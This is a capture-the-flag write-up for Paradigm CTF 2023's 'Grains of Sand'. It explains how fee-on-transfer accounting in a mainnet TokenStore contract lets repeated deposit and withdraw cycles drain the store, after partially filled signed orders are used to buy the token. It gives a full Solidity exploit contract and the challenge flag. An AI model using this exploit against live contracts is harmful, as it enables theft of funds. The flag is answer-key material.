---
title: Blockchain - Grains of Sand
description: 2023 | Paradigm CTF | PWN
tags:
    - smart contract
    - fee on transfer
    - signature replay
    - dune
---

## Description

At what point does it stop being a heap?

??? note "Deploy.s.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.0;

    import "forge-ctf/CTFDeployment.sol";
    import "../src/Challenge.sol";

    contract Deploy is CTFDeployment {
        function deploy(address system, address) internal override returns (address challenge) {
            vm.startBroadcast(system);

            challenge = address(new Challenge());

            vm.stopBroadcast();
        }
    }
    ```

??? note "src/Challenge.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.0;

    import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

    contract Challenge {
        IERC20 private immutable TOKEN = IERC20(0xC937f5027D47250Fa2Df8CbF21F6F88E98817845);

        address private immutable TOKENSTORE = 0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8;

        uint256 private immutable INITIAL_BALANCE;

        constructor() {
            INITIAL_BALANCE = TOKEN.balanceOf(TOKENSTORE);
        }

        function isSolved() external view returns (bool) {
            return INITIAL_BALANCE - TOKEN.balanceOf(TOKENSTORE) >= 11111e8;
        }
    }
    ```

## Solution

- The private chain is forked from the Ethereum mainnet block with block number $18437825$. And to solve the challenge, the token balance of the token store needs to be decreased by at least $11111 \times 10^8$ 

    ```js
    // challenge.py
    def get_anvil_instances(self) -> Dict[str, LaunchAnvilInstanceArgs]:
        return {
            "main": self.get_anvil_instance(fork_block_num=18_437_825),
        }
    ```

- The token GoldReserve (XGR) charges a fee when transferring, but the token store does not support fee-on-transfer tokens. So we can repeatedly deposit and withdraw to drain tokens from the store

    ```js
    function depositToken(address _token, uint _amount) deprecable {
        ...
        if (!Token(_token).transferFrom(msg.sender, this, _amount)) {
            revert();
        }
        tokens[_token][msg.sender] = safeAdd(tokens[_token][msg.sender], _amount);  // @note The amount received could be less than _amount
        Deposit(_token, msg.sender, _amount, tokens[_token][msg.sender]);
    }

    function withdrawToken(address _token, uint _amount) {
        ...
        tokens[_token][msg.sender] = safeSub(tokens[_token][msg.sender], _amount);
        if (!Token(_token).transfer(msg.sender, _amount)) {
            revert();
        }
        Withdraw(_token, msg.sender, _amount, tokens[_token][msg.sender]);
    }
    ```

- Now we need to get some GoldReserve tokens first! Through the `trade()` function, we can exchange for $XGR with signatures

    ```js
    function trade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive,
        uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount) {
        bytes32 hash = sha256(this, _tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce);
        // Check order signatures and expiration, also check if not fulfilled yet
        if (ecrecover(sha3("\x19Ethereum Signed Message:\n32", hash), _v, _r, _s) != _user ||
            block.number > _expires ||
            safeAdd(orderFills[_user][hash], _amount) > _amountGet) {
            revert();
        }
        tradeBalances(_tokenGet, _amountGet, _tokenGive, _amountGive, _user, msg.sender, _amount);
        orderFills[_user][hash] = safeAdd(orderFills[_user][hash], _amount);
        Trade(_tokenGet, _amount, _tokenGive, _amountGive * _amount / _amountGet, _user, msg.sender, _nonce);
    }

    function tradeBalances(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive,
        address _user, address _caller, uint _amount) private {
        ...
        tokens[_tokenGet][_user] = safeAdd(tokens[_tokenGet][_user], safeAdd(_amount, rebateValue));
        tokens[_tokenGet][_caller] = safeSub(tokens[_tokenGet][_caller], safeAdd(_amount, feeTakeValue));
        tokens[_tokenGive][_user] = safeSub(tokens[_tokenGive][_user], tokenGiveValue);
        tokens[_tokenGive][_caller] = safeAdd(tokens[_tokenGive][_caller], tokenGiveValue);
        tokens[_tokenGet][feeAccount] = safeAdd(tokens[_tokenGet][feeAccount], safeSub(feeTakeValue, rebateValue));
        ...
    }
    ```

- Trading orders can be partially filled. By using [Dune](https://dune.com/queries/3239317), we can find unexpired orders for GoldReserve tokens. Luckily, there are two orders with large amounts of unsold tokens XD

    tx_hash | _amount | _amountGet
    -|-|-
    0x1483f5c6158dfb9a899b137ccfa988fb2b1f6927854dcd83e0a29caadd0e38ba | 4200000000000000 | 84000000000000000
    0x6d727f761c7744bebf4a8773f5a06cd7af280dcda0b55c0995aea47d5570f1a1 | 4246800000000000 | 42468000000000000

### Exploitation

```js
interface ITokenStore {
    function tokens(address _token, address _user) external view returns (uint256);
    function deposit() external payable;
    function depositToken(address _token, uint _amount) external;
    function withdrawToken(address _token, uint _amount) external;
    function trade(
        address _tokenGet,
        uint _amountGet,
        address _tokenGive,
        uint _amountGive,
        uint _expires,
        uint _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s,
        uint _amount
    ) external;
    function availableVolume(
        address _tokenGet,
        uint _amountGet,
        address _tokenGive,
        uint _amountGive,
        uint _expires,
        uint _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) external view returns (uint256);
}

contract Solve is CTFSolver {
    ITokenStore tokenStore = ITokenStore(0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8);

    function doTrade(
        address _tokenGet,
        uint _amountGet,
        address _tokenGive,
        uint _amountGive,
        uint _expires,
        uint _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) internal {
        uint256 amount = tokenStore.availableVolume(_tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce, _user, _v, _r, _s);
        tokenStore.trade(_tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce, _user, _v, _r, _s, amount);
    }

    function solve(address _challenge, address player) internal override {
        Challenge challenge = Challenge(_challenge);
        address token = 0xC937f5027D47250Fa2Df8CbF21F6F88E98817845;
        tokenStore.deposit{value: 10 ether}();  // to buy $XGR
        doTrade(
            address(0),
            84000000000000000,
            token,
            200000000000,
            108142282,
            470903382,
            address(0xa219Fb3CfAE449F6b5157c1200652cc13e9c9EA8),
            28,
            0xf164a3e185694dadeb11a9e9e7371929675d2eb2a6e9daa4508e96bc81741018,
            0x314f3b6d5ce7c3f396604e87373fe4fe0a10bef597287d840b942e57595cb29a
        );
        doTrade(
            address(0),
            42468000000000000,
            token,
            1000000000000,
            109997981,
            249363390,
            address(0x6FFacaa9A9c6f8e7CD7D1C6830f9bc2a146cF10C),
            28,
            0x2b80ada8a8d94ed393723df8d1b802e1f05e623830cf117e326b30b1780ae397,
            0x65397616af0ec4d25f828b25497c697c58b3dcc852259eaf7c72ff487ce76e1e
        );

        IERC20(token).approve(address(tokenStore), type(uint256).max);
        tokenStore.withdrawToken(token, tokenStore.tokens(token, player));
        while(!challenge.isSolved()) {
            tokenStore.depositToken(token, IERC20(token).balanceOf(player));
            tokenStore.withdrawToken(token, tokenStore.tokens(token, player));
        }
    }
}
```

### Flag

> PCTF{f33_70K3nS_cauS1n9_pR08L3Ms_a9a1N}